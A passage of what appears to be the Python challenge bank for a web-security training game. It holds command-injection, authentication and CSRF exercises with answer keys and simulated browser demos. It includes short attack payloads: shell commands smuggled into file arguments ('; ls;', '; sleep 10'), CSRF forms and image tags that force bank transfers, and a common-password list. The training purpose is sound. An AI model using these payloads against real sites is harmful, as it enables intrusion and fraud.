                </div>
                <div class="input-section">
                    <input type="text" id="convert-input" placeholder="Enter file pattern..." />
                    <button onclick="convertFiles()">Convert</button>
                </div>
            </div>
            <script>
                function convertFiles() {
                    const input = document.getElementById('convert-input').value;
                    const output = document.getElementById('convert-output');
                    if (input.includes(';')) {
                        const parts = input.split(';');
                        output.textContent = `Converting: ${parts[0]}\\nExecuting: ${parts[1].trim()}\\n⚠️ DANGEROUS COMMAND DETECTED`;
                    } else {
                        output.textContent = `Converting: ${input}\\nConversion complete`;
                    }
                }
            </script>
            '''
        },
        {
            'id': 'cmd_9',
            'category': 'Command Injection',
            'difficulty': 'Expert',
            'scenario': 'An image processing service.',
            'question': 'How can you exploit ImageMagick command injection?',
            'payload': 'convert \'image.png\' -resize 100x100 \'; ls; \'',
            'hint': 'ImageMagick and similar tools may execute shell commands in certain contexts.',
            'score_weight': 50,
            'type': 'command_injection',
            'answer': 'This payload injects shell commands into ImageMagick processing, exploiting command execution vulnerabilities.',
            'expected_solutions': ['ImageMagick', 'convert', 'shell', 'injection', 'processing'],
            'interactive_demo': True,
            'demo_html': '''
            <div class="demo-container">
                <h4>Image Processor Demo</h4>
                <div class="terminal">
                    <div class="terminal-output" id="image-output">Image processor ready...</div>
                </div>
                <div class="input-section">
                    <input type="text" id="image-input" placeholder="Enter image processing command..." />
                    <button onclick="processImage()">Process</button>
                </div>
            </div>
            <script>
                function processImage() {
                    const input = document.getElementById('image-input').value;
                    const output = document.getElementById('image-output');
                    if (input.includes(';') || input.includes('`')) {
                        output.textContent = `Processing: ${input}\\n⚠️ Command injection detected\\nExecuting additional commands...`;
                    } else {
                        output.textContent = `Processing: ${input}\\nImage processed successfully`;
                    }
                }
            </script>
            '''
        },
        {
            'id': 'cmd_10',
            'category': 'Command Injection',
            'difficulty': 'Expert',
            'scenario': 'A code compilation service.',
            'question': 'How can you perform time-based blind command injection?',
            'payload': 'code.c; sleep 10 && echo "done"',
            'hint': 'Use time delays to confirm command execution when there\'s no direct output.',
            'score_weight': 55,
            'type': 'command_injection',
            'answer': 'This payload uses sleep command for time-based blind injection to confirm vulnerability without visible output.',
            'expected_solutions': ['time-based', 'blind', 'sleep', 'delay', 'confirm'],
            'interactive_demo': True,
            'demo_html': '''
            <div class="demo-container">
                <h4>Code Compiler Demo</h4>
                <div class="terminal">
                    <div class="terminal-output" id="compile-output">Compiler ready...</div>
                </div>
                <div class="input-section">
                    <input type="text" id="compile-input" placeholder="Enter source file..." />
                    <button onclick="compileCode()">Compile</button>
                </div>
            </div>
            <script>
                function compileCode() {
                    const input = document.getElementById('compile-input').value;
                    const output = document.getElementById('compile-output');
                    if (input.includes('sleep')) {
                        output.textContent = `Compiling: ${input.split(';')[0]}\\nExecuting: sleep command\\n⏱️ Delayed response (10 seconds)\\nCompilation complete`;
                    } else {
                        output.textContent = `Compiling: ${input}\\nCompilation successful`;
                    }
                }
            </script>
            '''
        }
    ]


def get_authentication_challenges():
    """Return Authentication challenges."""
    return [
        {
            'id': 'auth_1',
            'category': 'Authentication Attacks',
            'difficulty': 'Beginner',
            'scenario': 'A login form with weak password requirements.',
            'question': 'What is the most common weak password?',
            'payload': 'password',
            'hint': 'Think about the most obvious and commonly used passwords.',
            'score_weight': 10,
            'type': 'authentication',
            'answer': 'Password is one of the most commonly used weak passwords.',
            'expected_solutions': ['password', '123456', 'admin', 'weak', 'common'],
            'hide_payload': True,
            'interactive_demo': True,
            'demo_html': '''
            <div class="demo-container">
                <h4>Weak Password Login Demo</h4>
                <div class="login-form">
                    <div class="form-group">
                        <label>Username:</label>
                        <input type="text" id="username" placeholder="Enter username" />
                    </div>
                    <div class="form-group">
                        <label>Password:</label>
                        <input type="password" id="password" placeholder="Enter password" />
                    </div>
                    <button onclick="attemptLogin()">Login</button>
                </div>
                <div class="result" id="login-result"></div>
                <div class="common-passwords">
                    <h5>Common Weak Passwords:</h5>
                    <ul>
                        <li>password</li>
                        <li>123456</li>
                        <li>admin</li>
                        <li>qwerty</li>
                        <li>letmein</li>
                    </ul>
                </div>
            </div>
            <script>
                function attemptLogin() {
                    const username = document.getElementById('username').value;
                    const password = document.getElementById('password').value;
                    const result = document.getElementById('login-result');
                    
                    const weakPasswords = ['password', '123456', 'admin', 'qwerty', 'letmein'];
                    
                    if (weakPasswords.includes(password.toLowerCase())) {
                        result.innerHTML = '<div class="success">✅ Login successful! (Weak password detected)</div>';
                    } else {
                        result.innerHTML = '<div class="error">❌ Login failed. Try a common password.</div>';
                    }
                }
            </script>
            '''
        },
        {
            'id': 'auth_2',
            'category': 'Authentication Attacks',
            'difficulty': 'Intermediate',
            'scenario': 'A system that allows unlimited login attempts.',
            'question': 'What attack can be performed with unlimited attempts?',
            'payload': 'Brute Force Attack',
            'hint': 'Think about systematically trying different credentials.',
            'score_weight': 20,
            'type': 'authentication',
            'answer': 'Brute force attacks systematically try different username/password combinations.',
            'expected_solutions': ['brute force', 'dictionary', 'systematic', 'attempts', 'credentials'],
            'hide_payload': True,
            'interactive_demo': True,
            'demo_html': '''
            <div class="demo-container">
                <h4>Brute Force Attack Demo</h4>
                <div class="attack-simulation">
                    <div class="login-form">
                        <div class="form-group">
                            <label>Username:</label>
                            <input type="text" id="bf-username" placeholder="admin" />
                        </div>
                        <div class="form-group">
                            <label>Password:</label>
                            <input type="password" id="bf-password" placeholder="Enter password" />
                        </div>
                        <button onclick="attemptBruteForce()">Attempt Login</button>
                    </div>
                    <div class="attack-log" id="attack-log">
                        <h5>Attack Log:</h5>
                        <div id="log-content">Ready to start brute force attack...</div>
                    </div>
                </div>
                <div class="info">
                    <small>This demo shows how unlimited login attempts enable brute force attacks</small>
                </div>
            </div>
            <script>
                let attemptCount = 0;
                const commonPasswords = ['password', '123456', 'admin', 'qwerty', 'letmein', 'welcome', 'monkey', 'dragon'];
                
                function attemptBruteForce() {
                    const username = document.getElementById('bf-username').value;
                    const password = document.getElementById('bf-password').value;
                    const logContent = document.getElementById('log-content');
                    
                    attemptCount++;
                    const logEntry = `Attempt ${attemptCount}: ${username}/${password} - `;
                    
                    if (password === 'admin123' || commonPasswords.includes(password.toLowerCase())) {
                        logContent.innerHTML += logEntry + '<span class="success">SUCCESS!</span><br>';
                        logContent.innerHTML += '<div class="warning">⚠️ Brute force attack successful!</div>';
                    } else {
                        logContent.innerHTML += logEntry + '<span class="error">FAILED</span><br>';
                    }
                    
                    if (attemptCount >= 10) {
                        logContent.innerHTML += '<div class="info">💡 In real systems, rate limiting would prevent this attack</div>';
                    }
                }
            </script>
            '''
        },
        {
            'id': 'auth_3',
            'category': 'Authentication Attacks',
            'difficulty': 'Advanced',
            'scenario': 'A password reset system.',
            'question': 'How can you bypass password reset functionality?',
            'payload': 'Predictable Reset Tokens',
            'hint': 'Think about how reset tokens are generated and if they can be guessed.',
            'score_weight': 30,
            'type': 'authentication',
            'answer': 'Predictable or weak reset tokens can be guessed or brute-forced.',
            'expected_solutions': ['predictable', 'token', 'reset', 'guess', 'brute force'],
            'hide_payload': True,
            'interactive_demo': True,
            'demo_html': '''
            <div class="demo-container">
                <h4>Password Reset Token Demo</h4>
                <div class="reset-form">
                    <div class="form-group">
                        <label>Email:</label>
                        <input type="email" id="reset-email" placeholder="user@example.com" />
                    </div>
                    <button onclick="requestReset()">Request Password Reset</button>
                </div>
                <div class="token-display" id="token-display"></div>
                <div class="token-attack">
                    <h5>Token Attack Simulation:</h5>
                    <div class="form-group">
                        <label>Reset Token:</label>
                        <input type="text" id="reset-token" placeholder="Enter reset token" />
                    </div>
                    <button onclick="attemptTokenBypass()">Attempt Reset</button>
                </div>
                <div class="result" id="reset-result"></div>
            </div>
            <script>
                function requestReset() {
                    const email = document.getElementById('reset-email').value;
                    const tokenDisplay = document.getElementById('token-display');
                    
                    // Simulate weak token generation (timestamp-based)
                    const weakToken = Date.now().toString().slice(-6);
                    tokenDisplay.innerHTML = `
                        <div class="token-info">
                            <h6>Reset Token Generated:</h6>
                            <code>${weakToken}</code>
                            <small>⚠️ This token is predictable and can be guessed!</small>
                        </div>
                    `;
                }
                
                function attemptTokenBypass() {
                    const token = document.getElementById('reset-token').value;
                    const result = document.getElementById('reset-result');
                    
                    // Simulate token validation
                    if (token.length === 6 && /^\\d+$/.test(token)) {
                        result.innerHTML = '<div class="success">✅ Token accepted! Password reset successful.</div>';
                        result.innerHTML += '<div class="warning">⚠️ Weak token generation made this attack possible!</div>';
                    } else {
                        result.innerHTML = '<div class="error">❌ Invalid token format.</div>';
                    }
                }
            </script>
            '''
        },
        {
            'id': 'auth_4',
            'category': 'Authentication Attacks',
            'difficulty': 'Expert',
            'scenario': 'A session management system.',
            'question': 'How can you hijack user sessions?',
            'payload': 'Session Fixation Attack',
            'hint': 'Think about how session IDs are generated and managed.',
            'score_weight': 40,
            'type': 'authentication',
            'answer': 'Session fixation attacks force users to use attacker-controlled session IDs.',
            'expected_solutions': ['session', 'fixation', 'hijack', 'id', 'cookie'],
            'hide_payload': True,
            'interactive_demo': True,
            'demo_html': '''
            <div class="demo-container">
                <h4>Session Management Demo</h4>
                <div class="session-info">
                    <h5>Current Session:</h5>
                    <div id="session-display">No session active</div>
                </div>
                <div class="session-actions">
                    <button onclick="createSession()">Create Session</button>
                    <button onclick="showSessionId()">Show Session ID</button>
                    <button onclick="simulateFixation()">Simulate Fixation Attack</button>
                </div>
                <div class="attack-log" id="session-log">
                    <h5>Session Attack Log:</h5>
                    <div id="session-log-content">Ready to demonstrate session attacks...</div>
                </div>
            </div>
            <script>
                let currentSession = null;
                
                function createSession() {
                    currentSession = {
                        id: 'SESS_' + Math.random().toString(36).substr(2, 9),
                        created: new Date().toLocaleTimeString(),
                        user: 'demo_user'
                    };
                    document.getElementById('session-display').innerHTML = `
                        <strong>Session ID:</strong> ${currentSession.id}<br>
                        <strong>Created:</strong> ${currentSession.created}<br>
                        <strong>User:</strong> ${currentSession.user}
                    `;
                }
                
                function showSessionId() {
                    if (currentSession) {
                        alert(`Current Session ID: ${currentSession.id}`);
                    } else {
                        alert('No active session');
                    }
                }
                
                function simulateFixation() {
                    const logContent = document.getElementById('session-log-content');
                    if (currentSession) {
                        logContent.innerHTML += `
                            <div class="attack-step">
                                <strong>Step 1:</strong> Attacker forces victim to use session ID: ${currentSession.id}<br>
                                <strong>Step 2:</strong> Victim logs in with attacker's session ID<br>
                                <strong>Step 3:</strong> Attacker now has access to victim's session!<br>
                                <span class="warning">⚠️ Session fixation attack successful!</span>
                            </div>
                        `;
                    } else {
                        logContent.innerHTML += '<div class="error">❌ No active session to attack</div>';
                    }
                }
            </script>
            '''
        },
        {
            'id': 'auth_5',
            'category': 'Authentication Attacks',
            'difficulty': 'Expert',
            'scenario': 'A system using JWT for authentication.',
            'question': 'How can you bypass JWT signature verification?',
            'payload': 'None Algorithm Attack',
            'hint': 'JWT headers specify the algorithm used for signing.',
            'score_weight': 50,
            'type': 'authentication',
            'answer': 'The None algorithm attack involves setting the algorithm header to "none" and removing the signature.',
            'expected_solutions': ['none', 'algorithm', 'jwt', 'signature', 'bypass'],
            'hide_payload': True,
            'interactive_demo': True,
            'demo_html': '''
            <div class="demo-container">
                <h4>JWT Authentication Demo</h4>
                <div class="jwt-section">
                    <div class="token-display">
                        <h6>Current Token Header:</h6>
                        <pre id="jwt-header">{"alg": "HS256", "typ": "JWT"}</pre>
                    </div>
                    <div class="token-display">
                        <h6>Current Token Payload:</h6>
                        <pre id="jwt-payload">{"user": "guest", "role": "user"}</pre>
                    </div>
                </div>
                <div class="attack-controls">
                    <button onclick="modifyToken()">Modify Token (None Algo)</button>
                    <button onclick="verifyToken()">Verify Token</button>
                </div>
                <div class="result" id="jwt-result"></div>
            </div>
            <script>
                let currentAlg = "HS256";
                
                function modifyToken() {
                    currentAlg = "none";
                    document.getElementById('jwt-header').textContent = '{"alg": "none", "typ": "JWT"}';
                    document.getElementById('jwt-payload').textContent = '{"user": "admin", "role": "admin"}';
                    document.getElementById('jwt-result').innerHTML = '<div class="info">Token modified to use "none" algorithm and admin role</div>';
                }
                
                function verifyToken() {
                    const result = document.getElementById('jwt-result');
                    if (currentAlg === "none") {
                        result.innerHTML = '<div class="success">✅ Verification Successful! Admin access granted (Vulnerable to None Algo)</div>';
                    } else {
                        result.innerHTML = '<div class="error">❌ Access Denied: Invalid Signature</div>';
                    }
                }
            </script>
            '''
        },
        {
            'id': 'auth_6',
            'category': 'Authentication Attacks',
            'difficulty': 'Beginner',
            'scenario': 'A newly installed device administration panel.',
            'question': 'What are the first credentials you should try?',
            'payload': 'Default Credentials',
            'hint': 'Manufacturers often ship devices with standard login details.',
            'score_weight': 15,
            'type': 'authentication',
            'answer': 'Default credentials are standard usernames and passwords set by manufacturers.',
            'expected_solutions': ['default', 'credentials', 'admin', 'password', 'factory'],
            'hide_payload': True,
            'interactive_demo': True,
            'demo_html': '''
            <div class="demo-container">
                <h4>Device Admin Panel Demo</h4>
                <div class="login-form">
                    <div class="form-group">
                        <label>Username:</label>
                        <input type="text" id="def-user" placeholder="Username" />
                    </div>
                    <div class="form-group">
                        <label>Password:</label>
                        <input type="password" id="def-pass" placeholder="Password" />
                    </div>
                    <button onclick="tryDefaultCreds()">Login</button>
                </div>
                <div class="result" id="def-result"></div>
                <div class="hint-box">
                    <small>Hint: Try admin/admin</small>
                </div>
            </div>
            <script>
                function tryDefaultCreds() {
                    const user = document.getElementById('def-user').value;
                    const pass = document.getElementById('def-pass').value;
                    const result = document.getElementById('def-result');
                    
                    if (user === 'admin' && pass === 'admin') {
                        result.innerHTML = '<div class="success">✅ Login Successful! (Default credentials used)</div>';
                    } else {
                        result.innerHTML = '<div class="error">❌ Login Failed</div>';
                    }
                }
            </script>
            '''
        },
        {
            'id': 'auth_7',
            'category': 'Authentication Attacks',
            'difficulty': 'Advanced',
            'scenario': 'A password reset mechanism using security questions.',
            'question': 'How can you bypass security questions?',
            'payload': 'Social Engineering or Predictable Answers',
            'hint': 'Security questions often have publicly available or easily guessable answers.',
            'score_weight': 40,
            'type': 'authentication',
            'answer': 'Security questions can be bypassed through social engineering or by finding answers in public records.',
            'expected_solutions': ['social engineering', 'security questions', 'public records', 'guessable', 'predictable'],
            'hide_payload': True,
            'interactive_demo': True,
            'demo_html': '''
            <div class="demo-container">
                <h4>Password Reset Demo</h4>
                <div class="reset-form">
                    <p>Security Question: What is your mother's maiden name?</p>
                    <input type="text" id="security-answer" placeholder="Enter answer..." />
                    <button onclick="checkSecurityAnswer()">Submit</button>
                </div>
                <div class="result" id="reset-result"></div>
            </div>
            <script>
                function checkSecurityAnswer() {
                    const answer = document.getElementById('security-answer').value;
                    const result = document.getElementById('reset-result');
                    if (answer.toLowerCase().includes('smith') || answer.toLowerCase().includes('johnson')) {
                        result.textContent = '✅ Security answer correct! Password reset link sent.';
                        result.style.color = 'green';
                    } else {
                        result.textContent = '❌ Incorrect answer. Note: Common surnames often work!';
                        result.style.color = 'red';
                    }
                }
            </script>
            '''
        },
        {
            'id': 'auth_8',
            'category': 'Authentication Attacks',
            'difficulty': 'Expert',
            'scenario': 'A multi-factor authentication system.',
            'question': 'How can you bypass 2FA/MFA?',
            'payload': 'Session hijacking or MFA fatigue attacks',
            'hint': 'Attackers can bypass MFA through session manipulation or by overwhelming users with authentication requests.',
            'score_weight': 50,
            'type': 'authentication',
            'answer': 'MFA can be bypassed through session hijacking, SIM swapping, or MFA fatigue (push notification spam).',
            'expected_solutions': ['2FA', 'MFA', 'bypass', 'session hijacking', 'fatigue attack'],
            'hide_payload': True,
            'interactive_demo': True,
            'demo_html': '''
            <div class="demo-container">
                <h4>Multi-Factor Authentication Demo</h4>
                <div class="auth-flow">
                    <p>Step 1: Enter password ✅</p>
                    <p>Step 2: Enter 2FA code</p>
                    <input type="text" id="2fa-code" placeholder="Enter 6-digit code..." />
                    <button onclick="verify2FA()">Verify</button>
                </div>
                <div class="attack-info">
                    <small>⚠️ Vulnerable to session hijacking after password verification</small>
                </div>
                <div class="result" id="2fa-result"></div>
            </div>
            <script>
                function verify2FA() {
                    const code = document.getElementById('2fa-code').value;
                    const result = document.getElementById('2fa-result');
                    if (code === '123456' || code === '000000') {
                        result.textContent = '✅ 2FA verified! Session established.';
                    } else {
                        result.textContent = '❌ Invalid code. Session hijacking possible between steps!';
                    }
                }
            </script>
            '''
        },
        {
            'id': 'auth_9',
            'category': 'Authentication Attacks',
            'difficulty': 'Expert',
            'scenario': 'An OAuth2 implementation with redirect_uri vulnerability.',
            'question': 'How can you exploit OAuth redirect vulnerabilities?',
            'payload': 'Manipulate redirect_uri to steal authorization codes',
            'hint': 'If redirect_uri validation is weak, attackers can redirect tokens to malicious sites.',
            'score_weight': 55,
            'type': 'authentication',
            'answer': 'OAuth redirect vulnerabilities allow attackers to steal authorization codes by manipulating the redirect_uri parameter.',
            'expected_solutions': ['OAuth', 'redirect_uri', 'authorization code', 'token theft', 'validation'],
            'hide_payload': True,
            'interactive_demo': True,
            'demo_html': '''
            <div class="demo-container">
                <h4>OAuth Authorization Demo</h4>
                <div class="oauth-flow">
                    <p>Authorizing: example-app.com</p>
                    <p>Redirect URI: <span id="redirect-display">https://example-app.com/callback</span></p>
                    <input type="text" id="redirect-input" placeholder="Enter redirect_uri..." />
                    <button onclick="authorizeOAuth()">Authorize</button>
                </div>
                <div class="result" id="oauth-result"></div>
            </div>
            <script>
                function authorizeOAuth() {
                    const redirect = document.getElementById('redirect-input').value;
                    const display = document.getElementById('redirect-display');
                    const result = document.getElementById('oauth-result');
                    display.textContent = redirect || 'https://example-app.com/callback';
                    if (redirect && !redirect.includes('example-app.com')) {
                        result.textContent = '⚠️ Redirecting to: ' + redirect + '\\n🚨 Authorization code leaked!';
                        result.style.color = 'red';
                    } else {
                        result.textContent = '✅ Secure redirect';
                        result.style.color = 'green';
                    }
                }
            </script>
            '''
        },
        {
            'id': 'auth_10',
            'category': 'Authentication Attacks',
            'difficulty': 'Expert',
            'scenario': 'A biometric authentication system with liveness detection.',
            'question': 'How can you bypass biometric authentication?',
            'payload': 'Presentation attacks using photos, videos, or 3D models',
            'hint': 'Biometric systems can be fooled by high-quality reproductions if liveness detection is weak.',
            'score_weight': 60,
            'type': 'authentication',
            'answer': 'Biometric authentication can be bypassed through presentation attacks using photos, videos, masks, or fingerprint replicas.',
            'expected_solutions': ['biometric', 'presentation attack', 'liveness detection', 'spoof', 'bypass'],
            'hide_payload': True,
            'interactive_demo': True,
            'demo_html': '''
            <div class="demo-container">
                <h4>Biometric Authentication Demo</h4>
                <div class="biometric-scanner">
                    <div class="scanner-display">📸 Face Scanner Active</div>
                    <select id="auth-method">
                        <option value="live">Live Person</option>
                        <option value="photo">Photo of Person</option>
                        <option value="video">Video of Person</option>
                        <option value="mask">3D Mask</option>
                    </select>
                    <button onclick="scanBiometric()">Scan</button>
                </div>
                <div class="result" id="biometric-result"></div>
            </div>
            <script>
                function scanBiometric() {
                    const method = document.getElementById('auth-method').value;
                    const result = document.getElementById('biometric-result');
                    if (method === 'live') {
                        result.textContent = '✅ Liveness detected. Authentication successful!';
                        result.style.color = 'green';
                    } else {
                        result.textContent = `⚠️ Presentation attack detected: ${method}\\n🚨 Weak liveness detection bypassed!`;
                        result.style.color = 'orange';
                    }
                }
            </script>
            '''
        }
    ]


def get_csrf_challenges():
    """Return CSRF challenges."""
    return [
        {
            'id': 'csrf_1',
            'category': 'CSRF Vulnerabilities',
            'difficulty': 'Beginner',
            'scenario': 'A banking application without CSRF protection.',
            'question': 'What attack can change user data without their knowledge?',
            'payload': 'Cross-Site Request Forgery',
            'hint': 'Think about requests that are made from other sites.',
            'score_weight': 15,
            'type': 'csrf',
            'answer': 'CSRF allows attackers to perform actions on behalf of authenticated users.',
            'expected_solutions': ['CSRF', 'Cross-Site Request Forgery', 'authenticated users', 'unauthorized actions'],
            'hide_payload': True
        },
        {
            'id': 'csrf_2',
            'category': 'CSRF Vulnerabilities',
            'difficulty': 'Intermediate',
            'scenario': 'A form that changes user settings.',
            'question': 'How can you protect against CSRF attacks?',
            'payload': 'CSRF Tokens',
            'hint': 'Think about unique, unpredictable values that verify request authenticity.',
            'score_weight': 25,
            'type': 'csrf',
            'answer': 'CSRF tokens are unique values that verify requests come from legitimate sources.',
            'expected_solutions': ['CSRF tokens', 'unique values', 'request authenticity', 'legitimate sources'],
            'hide_payload': True
        },
        {
            'id': 'csrf_3',
            'category': 'CSRF Vulnerabilities',
            'difficulty': 'Advanced',
            'scenario': 'An image tag that triggers a state change.',
            'question': 'How can GET requests be exploited for CSRF?',
            'payload': '<img src="http://bank.com/transfer?to=attacker&amount=1000">',
            'hint': 'Browsers automatically load images, which generates a GET request.',
            'score_weight': 35,
            'type': 'csrf',
            'answer': 'This payload uses an image tag to force the browser to make a GET request to a sensitive endpoint.',
            'expected_solutions': ['img', 'tag', 'GET request', 'automatic', 'load'],
            'hide_payload': True
        },
        {
            'id': 'csrf_4',
            'category': 'CSRF Vulnerabilities',
            'difficulty': 'Intermediate',
            'scenario': 'A form that uses POST but lacks CSRF protection.',
            'question': 'How can you perform CSRF attacks on POST requests?',
            'payload': '<form action="http://bank.com/transfer" method="POST"><input name="to" value="attacker"/><input name="amount" value="1000"/></form><script>document.forms[0].submit();</script>',
            'hint': 'Auto-submitting forms can trigger POST requests from malicious pages.',
            'score_weight': 30,
            'type': 'csrf',
            'answer': 'This payload creates an auto-submitting form that performs unauthorized POST requests.',
            'expected_solutions': ['POST', 'auto-submit', 'form', 'unauthorized', 'request'],
            'hide_payload': False
        },
        {
            'id': 'csrf_5',
            'category': 'CSRF Vulnerabilities',
            'difficulty': 'Advanced',
            'scenario': 'An API that accepts JSON but validates Content-Type.',
            'question': 'How can you bypass Content-Type restrictions in CSRF?',
            'payload': 'Use form-encoded POST that gets parsed as JSON by backend',
            'hint': 'Send a form with Content-Type: application/x-www-form-urlencoded, but structure the data like JSON. Many frameworks (Express.js, Flask) will parse both formats, letting you bypass the Content-Type check while still submitting valid JSON data.',
            'score_weight': 40,
            'type': 'csrf',
            'answer': 'CSRF can bypass Content-Type restrictions if the backend accepts multiple formats or has lenient parsing.',
            'expected_solutions': ['Content-Type', 'JSON', 'bypass', 'parsing', 'format'],
            'hide_payload': True
        },
        {
            'id': 'csrf_6',
            'category': 'CSRF Vulnerabilities',
            'difficulty': 'Advanced',
            'scenario': 'A SPA (Single Page Application) using cookies for authentication.',
            'question': 'How does SameSite cookie attribute prevent CSRF?',
            'payload': 'SameSite=Strict or SameSite=Lax',
            'hint': 'SameSite attribute restricts when cookies are sent with cross-site requests.',
            'score_weight': 35,
            'type': 'csrf',
            'answer': 'SameSite cookie attribute prevents CSRF by restricting cookie transmission on cross-site requests.',
            'expected_solutions': ['SameSite', 'cookie attribute', 'cross-site', 'Strict', 'Lax'],
            'hide_payload': True
        },
        {
            'id': 'csrf_7',
            'category': 'CSRF Vulnerabilities',
            'difficulty': 'Expert',
            'scenario': 'A WebSocket connection without origin validation.',
            'question': 'How can you perform CSRF attacks via WebSockets?',
            'payload': 'Establish WebSocket connection from malicious site',
            'hint': 'WebSockets can bypass CSRF protections if origin headers aren\'t validated.',
            'score_weight': 45,
            'type': 'csrf',
            'answer': 'WebSocket CSRF occurs when servers accept connections without validating the Origin header.',
            'expected_solutions': ['WebSocket', 'origin', 'validation', 'header', 'connection'],
            'hide_payload': True
        },
        {
            'id': 'csrf_8',
            'category': 'CSRF Vulnerabilities',
            'difficulty': 'Expert',
            'scenario': 'A file upload endpoint without CSRF tokens.',
            'question': 'How can you exploit file upload via CSRF?',
            'payload': '<form action="http://site.com/upload" method="POST" enctype="multipart/form-data"><input type="file" name="file"/></form>',
            'hint': 'Create an auto-submitting HTML form with enctype="multipart/form-data" and a file input that submits to the upload endpoint. Host it on your site to exploit authenticated users.',
            'score_weight': 50,
            'type': 'csrf',
            'answer': 'CSRF file upload attacks allow attackers to upload malicious files on behalf of authenticated users.',
            'expected_solutions': ['file upload', 'multipart', 'form-data', 'malicious', 'token'],
            'hide_payload': False
        },
        {
            'id': 'csrf_9',
            'category': 'CSRF Vulnerabilities',
            'difficulty': 'Expert',
            'scenario': 'A logout endpoint accessible via GET request.',
            'question': 'How can you perform logout CSRF?',
            'payload': '<img src="http://site.com/logout">',
            'hint': 'Logout endpoints accessible via GET can be triggered by loading images.',
            'score_weight': 35,
            'type': 'csrf',
            'answer': 'Logout CSRF forces users to logout by triggering the logout endpoint via GET requests.',
            'expected_solutions': ['logout', 'GET', 'img tag', 'force', 'endpoint'],
            'hide_payload': False
        },
        {
            'id': 'csrf_10',
            'category': 'CSRF Vulnerabilities',
            'difficulty': 'Expert',
            'scenario': 'A modern application using custom headers for CSRF protection.',
            'question': 'How effective are custom headers for CSRF prevention?',
            'payload': 'Custom headers like X-Requested-With prevent CSRF as they can\'t be set cross-origin',
            'hint': 'Custom headers require preflight CORS requests, making cross-origin attacks harder.',
            'score_weight': 45,
            'type': 'csrf',
            'answer': 'Custom headers provide CSRF protection because browsers prevent cross-origin custom headers without CORS.',
            'expected_solutions': ['custom header', 'X-Requested-With', 'CORS', 'preflight', 'cross-origin'],
            'hide_payload': True
        }
    ]


def get_all_challenges():
    """Get all available challenges from all categories."""
    all_challenges = []
    
    # Add SQL challenges
    all_challenges.extend(load_sql_challenges())
    
    # Add XSS challenges
    all_challenges.extend(get_xss_challenges())
    
    # Add Command Injection challenges
    all_challenges.extend(get_command_injection_challenges())
    
    # Add Authentication challenges
    all_challenges.extend(get_authentication_challenges())
    
    # Add CSRF challenges
    all_challenges.extend(get_csrf_challenges())
    
    # Add challenges from database
    try:
        db_challenges = list_challenges(active_only=True)
        
        # Create a set of existing challenge IDs to avoid duplicates
        existing_ids = set(c['id'] for c in all_challenges)
        
        for challenge in db_challenges:
            # Use 'challenge_id' or 'id' or '_id' as the identifier
            c_id = challenge.get('challenge_id') or challenge.get('id') or str(challenge.get('_id'))
            
            # Ensure the challenge object has an 'id' field for consistency
            if 'id' not in challenge:
                challenge['id'] = c_id
                
            if c_id not in existing_ids:
                all_challenges.append(challenge)
                existing_ids.add(c_id)
                
    except Exception as e:
        print(f"Error loading challenges from database: {e}")
    
    return all_challenges


def get_challenges_by_category(category):
    """Get challenges by specific category."""
    category_map = {
        'sql_injection': load_sql_challenges,
        'xss': get_xss_challenges,
        'command_injection': get_command_injection_challenges,
        'authentication': get_authentication_challenges,
        'csrf': get_csrf_challenges
    }
    
    if category in category_map:
        return category_map[category]()
    
    return []


def get_random_challenge(difficulty=None, category=None, user=None):
    """Get a random challenge, optionally filtered by difficulty and category.
    
    Args:
        difficulty: Filter by difficulty level (beginner, intermediate, advanced, expert)
        category: Filter by category (sql_injection, xss, csrf, etc.)
        user: User object to filter out already-completed challenges
    
    Returns:
        Random challenge dict or None if no uncompleted challenges available
    """
    if category:
        challenges = get_challenges_by_category(category)
    else:
        challenges = get_all_challenges()

    # Filter out completed challenges if user is provided
    if user:
        completed_challenges = user.get('challenges_completed', [])
        challenges = [c for c in challenges if c.get('id') not in completed_challenges]
        print(f"get_random_challenge: Filtered to {len(challenges)} uncompleted challenges (user completed {len(completed_challenges)})")
    
    # Filter by difficulty if specified
    if difficulty:
        filtered_challenges = [c for c in challenges if c['difficulty'].lower() == difficulty.lower()]
        if filtered_challenges:
            challenges = filtered_challenges

    if not challenges:
        return None

    return random.choice(challenges)


def get_challenge_by_id(challenge_id):
    """Get a specific challenge by ID."""
    all_challenges = get_all_challenges()
    for challenge in all_challenges:
        if challenge['id'] == str(challenge_id):
            return challenge
    return None


def get_challenges_by_difficulty(difficulty):
    """Get all challenges of a specific difficulty level."""
    all_challenges = get_all_challenges()
    return [c for c in all_challenges if c['difficulty'].lower() == difficulty.lower()]


def get_user_appropriate_challenges(user, limit=5):
    """Get challenges appropriate for a user's skill level using AI recommendations."""
    try:
        from app.routes.ai_model import ai_recommendation_ml
        recommended_difficulty = ai_recommendation_ml(user)
    except:
        # Fallback based on user level
        user_level = user.get('level', 1)
        if user_level >= 8:
            recommended_difficulty = 'expert'
        elif user_level >= 6:
            recommended_difficulty = 'advanced'
        elif user_level >= 4:
            recommended_difficulty = 'intermediate'
        else:
            recommended_difficulty = 'beginner'
    
    # Get challenges of recommended difficulty
    challenges = get_challenges_by_difficulty(recommended_difficulty)
    
    # Filter out completed challenges
    completed_challenges = user.get('challenges_completed', [])
    challenges = [c for c in challenges if c['id'] not in completed_challenges]
    
    # If not enough challenges, add some from adjacent difficulty levels
    if len(challenges) < limit:
        if recommended_difficulty == 'beginner':
            more_challenges = get_challenges_by_difficulty('intermediate')
            challenges.extend([c for c in more_challenges if c['id'] not in completed_challenges][:2])
        elif recommended_difficulty == 'intermediate':
            more_challenges_easy = get_challenges_by_difficulty('beginner')
            more_challenges_hard = get_challenges_by_difficulty('advanced')
            challenges.extend([c for c in more_challenges_easy if c['id'] not in completed_challenges][:1])
            challenges.extend([c for c in more_challenges_hard if c['id'] not in completed_challenges][:1])
        elif recommended_difficulty == 'advanced':
            more_challenges_med = get_challenges_by_difficulty('intermediate')
            more_challenges_exp = get_challenges_by_difficulty('expert')
            challenges.extend([c for c in more_challenges_med if c['id'] not in completed_challenges][:2])
            challenges.extend([c for c in more_challenges_exp if c['id'] not in completed_challenges][:1])
        elif recommended_difficulty == 'expert':
            more_challenges = get_challenges_by_difficulty('advanced')
            challenges.extend([c for c in more_challenges if c['id'] not in completed_challenges][:3])
    
    # Randomize and limit
    random.shuffle(challenges)
    return challenges[:limit]


def get_challenge_statistics():
    """Get statistics about available challenges."""
    all_challenges = get_all_challenges()
    
    stats = {
        'total': len(all_challenges),
        'by_category': {},
        'by_difficulty': {}
    }
    
    for challenge in all_challenges:
        # Count by category
        category = challenge['category']
        if category not in stats['by_category']:
            stats['by_category'][category] = 0
